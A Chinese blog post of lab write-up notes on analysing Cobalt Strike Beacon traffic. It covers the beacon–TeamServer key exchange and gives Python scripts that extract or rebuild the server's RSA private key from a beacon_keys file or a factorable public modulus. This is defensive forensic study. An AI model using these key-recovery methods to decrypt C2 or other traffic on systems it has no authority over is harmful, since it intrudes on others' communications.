<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="lexsd6" />



<meta name="description" content="emm…本来以为一个可以一把梭的流量分析，但是一路边查阅资料边踩坑下来，发现还提有意思的（除了有些题目还有些屮的）。很难得有这样边刷题边查询资料边学习边成长的感觉了，于是准备把有意思的CobaltStrike流量分析知识小记下并顺带写下wp。">
<meta property="og:type" content="article">
<meta property="og:title" content="基于玄机靶场CobaltStrike流量分析题目的学习笔记">
<meta property="og:url" content="lexsd6.github.io/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/index.html">
<meta property="og:site_name" content="lexsd6&#39;s home">
<meta property="og:description" content="emm…本来以为一个可以一把梭的流量分析，但是一路边查阅资料边踩坑下来，发现还提有意思的（除了有些题目还有些屮的）。很难得有这样边刷题边查询资料边学习边成长的感觉了，于是准备把有意思的CobaltStrike流量分析知识小记下并顺带写下wp。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="lexsd6.github.io/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/IAq4qZHApAwrtoYW.png">
<meta property="og:image" content="lexsd6.github.io/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250426234022326.png">
<meta property="og:image" content="lexsd6.github.io/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250427083600348.png">
<meta property="og:image" content="lexsd6.github.io/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250427084502410.png">
<meta property="og:image" content="lexsd6.github.io/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/image-20250427212335301.png">
<meta property="article:published_time" content="2025-04-27T14:23:12.780Z">
<meta property="article:modified_time" content="2025-04-27T14:27:50.939Z">
<meta property="article:author" content="lexsd6">
<meta property="article:tag" content="应急响应">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="lexsd6.github.io/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/IAq4qZHApAwrtoYW.png">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="lexsd6&#39;s home" type="application/atom+xml">



    <link rel="shortcut icon" href="/title.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//lexsd6.github.io/js/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">



<link rel="stylesheet" href="/css/style.css">




<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>基于玄机靶场CobaltStrike流量分析题目的学习笔记 | lexsd6&#39;s home</title>

<script src="//lexsd6.github.io/js/jquery.min.js"></script>
<script src="//lexsd6.github.io/js/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//lexsd6.github.io/js/scrollreveal.min.js",
        search: true
    }
</script>



    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






<meta name="generator" content="Hexo 4.2.0"></head>
<body>


  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/lexsd6.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">lexsd6</a></h1>
        </hgroup>

        
        <p class="header-subtitle"> Clumsy birds have to start flying early</p>
        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:lexsd6@foxmail.com" title="Email"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa QQ" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DragonBones/" rel="tag">DragonBones</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine/" rel="tag">Machine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/code/" rel="tag">code</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/" rel="tag">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libc/" rel="tag">libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mics/" rel="tag">mics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/" rel="tag">node-js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem_resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/re/" rel="tag">re</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ruby/" rel="tag">ruby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/translate/" rel="tag">translate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/" target="_blank" rel="noopener">GitHub</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/" target="_blank" rel="noopener">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">一梦想成为五边形战士的老菜鸡</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>

    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lexsd6</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/lexsd6.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">lexsd6</a></h1>
            </hgroup>
            
            <p class="header-subtitle"> Clumsy birds have to start flying early</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:lexsd6@foxmail.com" title="Email"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap">



<article id="post-CobaltStrike流量分析-玄机靶场" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/" class="article-date">
      <time datetime="2025-04-27T14:23:12.780Z" itemprop="datePublished">2025-04-27</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      基于玄机靶场CobaltStrike流量分析题目的学习笔记
    </h1>
  


          <div style="margin-top:10px 0;margin-bottom:15px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <span class="post-count">9.2k字</span>
      </span>
    </span>
    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">阅读时长:</span>
        <span class="post-count">51分</span>
      </span>
    </span>
</div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
          
      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">玄机靶场</a>
    </div>


        
    <div class="article-tag tagcloud" >
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>

    </div>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>emm…本来以为一个可以一把梭的流量分析，但是一路边查阅资料边踩坑下来，发现还提有意思的（除了有些题目还有些屮的）。很难得有这样边刷题边查询资料边学习边成长的感觉了，于是准备把有意思的CobaltStrike流量分析知识小记下并顺带写下wp。<a id="more"></a></p>
<h2 id="CobaltStrike运行过程浅说"><a href="#CobaltStrike运行过程浅说" class="headerlink" title="CobaltStrike运行过程浅说"></a>CobaltStrike运行过程浅说</h2><p><code>Cobalt Strike</code> 分为 <code>客户端</code> 与 <code>服务端</code> ，服务端是一个，客户端可以有多个，可被团队进行分布式协作操作。</p>
<p><code>Cobalt Strike</code> 的 <code>Beacon</code> 支持异步通信和交互式通信。<code>Beacon</code> 可以选择通过 <code>DNS</code> 还是 <code>HTTP</code> 协议出口网络，你甚至可以在使用<code>Beacon</code> 通讯过程中切换 <code>HTTP</code> 和 <code>DNS</code>。其支持多主机连接，部署好 <code>Beacon</code> 后提交一个要连回的域名或主机的列表，<code>Beacon</code> 将通过这些主机轮询。其通信具体流程如下。</p>
<p><img src="./IAq4qZHApAwrtoYW.png" alt="img"></p>
<p>用文件来描述过程描述如下：</p>
<p>1、被控机先向 TeamServer 发送初始心跳包，包中包含了主机基础信息（如系统版本、权限等）和临时生成的会话协商密钥（即：<code>stager Beacon</code>文件），这些关键数据都使用 TeamServer 的 RSA 公钥进行加密，并以特定格式封装在 HTTP 请求的 Cookie 字段中传输。</p>
<p>2、TeamServer 在收到第一次心跳包后，会使用对应的 RSA 私钥解密数据包，获取主机信息和会话协商密钥，并基于该协商密钥（Raw key）派生生成两个新的密钥：用于数据加密的 AE 密钥（aeskey）和用于完整性校验的 HMAC密钥（hmac_key）。</p>
<p>3、被控端按照预设的休眠时间间隔（可配置）再次发送心跳包查询新命令。当存在待执行命令时，TeamServer 会使用会话 AES 密钥将命令加密后，作为 HTTP 响应包的 Body 返回。</p>
<p>4、被控端在接收到加密数据包后，使用会话 AES 密钥解密获取明文命令，执行后将结果数据重新加密，并通过 HTTPS POST 请求（通常使用特定接口如 /submit）回传给 TeamServer。</p>
<p>5、TeamServer 收到 POST 响应后，使用会话 AES 密钥解密数据，最终获取命令执行的明文回显结果。</p>
<p>6（不同情况）、当被控端在休眠间隔后发送心跳包查询，但 TeamServer 没有新命令需要下发时，TeamServer 会返回一个空响应包（通常为 HTTP 200 状态码 + 空 Body），用于维持连接状态和确认心跳。</p>
<p>注意到的是，在这过程中， <code>Cobalt Strike</code> 会默认使用 <code>GET</code> 方法发起请求，<code>Beacon</code> 会将元数据（例如AES密钥）使用 <code>RSA</code> 公钥加密后发送给 <code>C2</code> 服务器。这些<strong>元数据</strong>通常被编码为 <code>Base64</code> 字符串并作为 <code>Cookie</code> 发送。另外<code>Beacon</code> 的元数据传输过程中虽然使用的是 <code>RSA</code> 算法，但是 <code>Beacon</code> 任务的传输使用的却是 <code>AES</code> 算法加密的，而 <code>AES</code> 密钥则是 <code>Beacon</code> 随机生成的然后通过 <code>RSA</code> 交换 <code>AES</code>密钥。加解密算法为 <code>AES</code> ，密钥位长 <code>128</code> ，<code>CBC</code> 模式，填充标准 <code>PKCS7</code> 。</p>
<h2 id="CobaltStrike-流量分析破解思路"><a href="#CobaltStrike-流量分析破解思路" class="headerlink" title="CobaltStrike 流量分析破解思路"></a>CobaltStrike 流量分析破解思路</h2><p>因此总体而言，我们整个cs流量通讯过程中需要关注三种包和一个.cobaltstrike.beacon_keys文件：</p>
<p>1.<code>stager Beacon</code>  包：里面有完整的<code>stager Beacon</code>文件，通过解密文件我们可以得到server相关的细节信息。</p>
<p>2.任务下发包：即是响应不为空的心跳包。攻击者者下发命令到受害者的数据包，里面包含攻击者下发的命令信息。</p>
<p>3.结果回显包：受害者通过post回传结果包。</p>
<p>4..cobaltstrike.beacon_keys：TeamServer的RSA密钥对默认存储在<code>~/.cobaltstrike.beacon_keys</code>文件中，首次启动时自动生成。若未手动替换，所有Beacon通信均使用同一对密钥，这使得历史私钥泄露可能导致流量被解密。</p>
<p>我们要从这些包和文件里主要找：</p>
<p>1.<strong>RSA 私钥</strong>：通常是.cobaltstrike.beacon_keys 文件中获取。若未找到，则需要从<code>stager Beacon</code>  寻找里面有完整的<code>stager Beacon</code>文件，解密提取公钥。来提取其中的n和e，尝试分解n来获取pq来得到私钥</p>
<p>2.<strong>加密的元数据</strong>：通常位于 Beacon 首次心跳包的 <code>Cookie</code> 或 <code>Header</code> 中。</p>
<p>3.<strong>raw key</strong>：通过RSA 私钥 解密加密的元数据来获取。</p>
<h3 id="RSA-私钥获取"><a href="#RSA-私钥获取" class="headerlink" title="RSA 私钥获取"></a>RSA 私钥获取</h3><p>以本体而言题目我们可以通过漏洞攻击靶机在cs所在的目录（<code>./opt/Cobalt_Strike_4.5/Cobalt_Strike_4.5/.cobaltstrike.beacon_keys</code>）下读取出.cobaltstrike.beacon_keys 信息。再通过如下python脚本对.cobaltstrike.beacon_keys 文件进行提取。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> javaobj.v2 <span class="keyword">as</span> javaobj</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">".cobaltstrike.beacon_keys"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    pobj = javaobj.load(fd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_key</span><span class="params">(key_data, key_type)</span>:</span></span><br><span class="line">    key_data = bytes(map(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, key_data))</span><br><span class="line">    formatted_key = <span class="string">f"-----BEGIN <span class="subst">&#123;key_type&#125;</span> KEY-----\n"</span></span><br><span class="line">    formatted_key += base64.encodebytes(key_data).decode()</span><br><span class="line">    formatted_key += <span class="string">f"-----END <span class="subst">&#123;key_type&#125;</span> KEY-----"</span></span><br><span class="line">    <span class="keyword">return</span> formatted_key</span><br><span class="line"></span><br><span class="line">privateKey = format_key(pobj.array.value.privateKey.encoded.data, <span class="string">"PRIVATE"</span>)</span><br><span class="line">publicKey = format_key(pobj.array.value.publicKey.encoded.data, <span class="string">"PUBLIC"</span>)</span><br><span class="line"></span><br><span class="line">print(privateKey)</span><br><span class="line">print(publicKey)</span><br></pre></td></tr></table></figure>

<h5 id="未获取-cobaltstrike-beacon-keys的情况（n可以分解）"><a href="#未获取-cobaltstrike-beacon-keys的情况（n可以分解）" class="headerlink" title="未获取.cobaltstrike.beacon_keys的情况（n可以分解）"></a>未获取.cobaltstrike.beacon_keys的情况（n可以分解）</h5><p>在未获取.cobaltstrike.beacon_keys文件下，我们需要寻被控机先向 TeamServer 发送初始心跳包（<code>stager Beacon</code> ） 包提取出<code>stager Beacon</code>文件。用1788.py脚本（<a href="https://github.com/DidierStevens/DidierStevensSuite/blob/e28089a6d3f688cf9cd7b7bada9d95ab586e0541/1768.py）分解出公钥。在通过对公钥匙分析提取出n和e。" target="_blank" rel="noopener">https://github.com/DidierStevens/DidierStevensSuite/blob/e28089a6d3f688cf9cd7b7bada9d95ab586e0541/1768.py）分解出公钥。在通过对公钥匙分析提取出n和e。</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将你的16进制字符串放在这里</span></span><br><span class="line">hex_key = <span class="string">"30819f300d06092a864886f70d010101050003818d003081890281810093b4127271907b80352c6a15b6bb1701bd01657a2fba3ca1fba56d9a13e9f1f3121ac3aa70248f8621217fddfc0a484e78ebf4e5b48bb4804eababe5366cf4886b6ce2a5a113edd851fc5b2fb62a925043354000bbae7f2f75d7b0b7097a17b7c7de195174d4b17cee1499ae1e52e3ce3eec3f70011d971d022c0a8723def11d0203010001"</span><span class="comment"># 将十六进制字符串转换为字节</span></span><br><span class="line">key_bytes = binascii.unhexlify(hex_key)</span><br><span class="line"><span class="comment"># 导入RSA公钥</span></span><br><span class="line">rsa_key = RSA.import_key(key_bytes)</span><br><span class="line"><span class="comment"># 提取模数(n)和指数(e)</span></span><br><span class="line">n = rsa_key.n</span><br><span class="line">e = rsa_key.e</span><br><span class="line"><span class="comment"># 打印模数和指数</span></span><br><span class="line">print(<span class="string">f"Modulus (n): <span class="subst">&#123;n&#125;</span>"</span>)</span><br><span class="line">print(<span class="string">f"Exponent (e): <span class="subst">&#123;e&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将RSA公钥导出为PEM格式</span></span><br><span class="line">pem_key = rsa_key.publickey().export_key(format=<span class="string">'PEM'</span>)</span><br><span class="line"><span class="comment"># 打印PEM格式公钥</span></span><br><span class="line">print(pem_key.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>

<p>对n进行分解出pq后，再通过RSA脚本计算出私钥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric.utils <span class="keyword">import</span> (</span><br><span class="line">       encode_dss_signature,</span><br><span class="line">       decode_dss_signature,</span><br><span class="line">   )</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime, isprime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_rsa_keys_from_components</span><span class="params">(p, q, n, e, d)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">       使用提供的 n, e, d 生成 RSA 密钥对</span></span><br><span class="line"><span class="string">       :param n: 模数 (int)</span></span><br><span class="line"><span class="string">       :param e: 公钥指数 (int)</span></span><br><span class="line"><span class="string">       :param d: 私钥指数 (int)</span></span><br><span class="line"><span class="string">       :return: 公钥和私钥对象</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line"><span class="comment"># 创建 RSA 密钥对象</span></span><br><span class="line">       private_key = rsa.RSAPrivateNumbers(</span><br><span class="line">           p=p,</span><br><span class="line">           q=q,</span><br><span class="line">           d=d,</span><br><span class="line">           dmp1=d % (p - <span class="number">1</span>),</span><br><span class="line">           dmq1=d % (q - <span class="number">1</span>),</span><br><span class="line">           iqmp=rsa.rsa_crt_iqmp(p, q),</span><br><span class="line">           public_numbers=rsa.RSAPublicNumbers(e=e, n=n),</span><br><span class="line">       ).private_key(backend=default_backend())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取公钥</span></span><br><span class="line">       public_key = private_key.public_key()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> public_key, private_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_keys_to_pem</span><span class="params">(public_key, private_key, public_path, private_path)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">       将公钥和私钥保存为 PEM 格式的文件</span></span><br><span class="line"><span class="string">       :param public_key: 公钥对象</span></span><br><span class="line"><span class="string">       :param private_key: 私钥对象</span></span><br><span class="line"><span class="string">       :param public_path: 公钥文件路径</span></span><br><span class="line"><span class="string">       :param private_path: 私钥文件路径</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line"><span class="comment"># 序列化公钥为 PEM 格式</span></span><br><span class="line">       public_pem = public_key.public_bytes(</span><br><span class="line">           encoding=serialization.Encoding.PEM,</span><br><span class="line">           format=serialization.PublicFormat.SubjectPublicKeyInfo,</span><br><span class="line">       )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化私钥为 PEM 格式</span></span><br><span class="line">       private_pem = private_key.private_bytes(</span><br><span class="line">           encoding=serialization.Encoding.PEM,</span><br><span class="line">           format=serialization.PrivateFormat.PKCS8,</span><br><span class="line">           encryption_algorithm=serialization.NoEncryption(),</span><br><span class="line">       )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存公钥到文件</span></span><br><span class="line"><span class="keyword">with</span> open(public_path, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">           f.write(public_pem)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存私钥到文件</span></span><br><span class="line"><span class="keyword">with</span> open(private_path, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">           f.write(private_pem)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">       p = </span><br><span class="line">       q = </span><br><span class="line">       e = </span><br><span class="line">       n = p * q</span><br><span class="line">       phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">       d = gmpy2.invert(e, phi)</span><br><span class="line">       print(d)</span><br><span class="line">       d = int(d)</span><br><span class="line"><span class="comment"># 生成密钥对</span></span><br><span class="line">       public_key, private_key = generate_rsa_keys_from_components(p, q, n, e, d)</span><br><span class="line"><span class="comment"># 保存密钥到文件</span></span><br><span class="line">       save_keys_to_pem(public_key, private_key, <span class="string">"publicKey.pem"</span>, <span class="string">"privateKey.pem"</span>)</span><br><span class="line">       print(<span class="string">"公钥和私钥已成功生成并保存到文件中！"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">       main()</span><br></pre></td></tr></table></figure>

<h3 id="加密的元数据获取"><a href="#加密的元数据获取" class="headerlink" title="加密的元数据获取"></a>加密的元数据获取</h3><p>通常位于 Beacon 首次心跳包的 <code>Cookie</code> 或 <code>Header</code> 中。在本题目中，我们en_US/all.js心跳包中的Cookie的找到未加密的数据。</p>
